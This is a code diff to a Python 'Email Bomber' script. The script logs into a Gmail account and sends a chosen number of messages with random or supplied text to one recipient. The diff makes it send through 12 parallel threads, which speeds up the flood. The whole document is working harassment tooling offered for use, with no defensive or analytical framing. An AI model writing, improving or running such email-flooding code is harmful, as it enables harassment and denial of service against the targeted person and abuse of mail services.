@@ -2,6 +2,7 @@ import smtplib
 import random
 import argparse
 from email.message import EmailMessage
+from concurrent.futures import ThreadPoolExecutor
 
 parser = argparse.ArgumentParser(
     description="📨 Email Bomber Script by Zander Brooks",
@@ -31,7 +32,8 @@ random.shuffle(phrases)
 
 
 
-for i in range(args.count):
+def send_email(i):
+
 
     msg = EmailMessage()
     msg['From'] = args.sender
@@ -40,9 +42,8 @@ for i in range(args.count):
     if(args.body):
         msg.set_content(args.body)
     else:
-        msg.set_content(phrases[i].strip())
-
-    
+        msg.set_content(phrases[i])
+        
     try:
 
         #Ports to use incase 465 Doesnt work for you
@@ -53,6 +54,8 @@ for i in range(args.count):
         with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
             smtp.login(args.sender,args.password)
             smtp.send_message(msg)
-            print("Email sent sucessfully!")
+            print(f"[{i+1}] Email sent successfully!")
     except Exception as e:
-        print(f'Error sending email: {e}')
+        print(f"[{i+1}] Error sending email: {e}")
+with ThreadPoolExecutor(max_workers=12) as executor:
+    executor.map(send_email, range(args.count))
